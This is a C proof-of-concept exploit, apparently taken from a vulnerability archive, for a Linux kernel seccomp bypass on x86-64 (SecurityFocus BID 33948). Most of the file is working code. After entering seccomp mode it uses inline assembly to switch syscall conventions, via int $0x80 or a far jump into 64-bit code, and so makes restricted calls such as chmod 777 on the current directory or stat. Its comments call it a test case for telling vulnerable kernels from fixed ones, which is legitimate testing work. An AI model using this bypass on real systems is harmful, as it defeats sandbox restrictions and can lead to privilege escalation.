/*
source: http://www.securityfocus.com/bid/33948/info

The Linux kernel is prone to a local security-bypass vulnerability.

A local attacker may be able to exploit this issue to bypass access control and make restricted system calls, which may result in an elevation of privileges. 
*/

	/* test case for seccomp circumvention on x86-64
	   There are two failure modes: compile with -m64 or compile with -m32.

	   The -m64 case is the worst one, because it does "chmod 777 ." (could
	   be any chmod call).  The -m32 case demonstrates it was able to do
	   stat(), which can glean information but not harm anything directly.

	   A buggy kernel will let the test do something, print, and exit 1; a
	   fixed kernel will make it exit with SIGKILL before it does anything.
	*/

	#define _GNU_SOURCE
	#include <assert.h>
	#include <inttypes.h>
	#include <stdio.h>
	#include <linux/prctl.h>
	#include <sys/stat.h>
	#include <unistd.h>
	#include <asm/unistd.h>

	int
	main (int argc, char **argv)
	{
	  char buf[100];
	  static const char dot[] = ".";
	  long ret;
	  unsigned st[24];
	  if (prctl (PR_SET_SECCOMP, 1, 0, 0, 0) != 0)
	    perror ("prctl(PR_SET_SECCOMP) -- not compiled into kernel?");
	#ifdef __x86_64__
	  assert ((uintptr_t) dot < (1UL << 32));
	  asm ("int $0x80 # %0 <- %1(%2 %3)"
	       : "=a" (ret) : "0" (15), "b" (dot), "c" (0777));
	  ret = snprintf (buf, sizeof buf,
			  "result %ld (check mode on .!)\n", ret);
	#elif defined __i386__
	  asm (".code32\n"
	       "pushl %%cs\n"
	       "pushl $2f\n"
	       "ljmpl $0x33, $1f\n"
	       ".code64\n"
	       "1: syscall # %0 <- %1(%2 %3)\n"
	       "lretl\n"
	       ".code32\n"
	       "2:"
	       : "=a" (ret) : "0" (4), "D" (dot), "S" (&st));
	  if (ret == 0)
	    ret = snprintf (buf, sizeof buf,
			    "stat . -> st_uid=%u\n", st[7]);
	  else
	    ret = snprintf (buf, sizeof buf, "result %ld\n", ret);
	#else
	# error "not this one"
	#endif
	  write (1, buf, ret);

	  syscall (__NR_exit, 1);
	  return 2;
	}
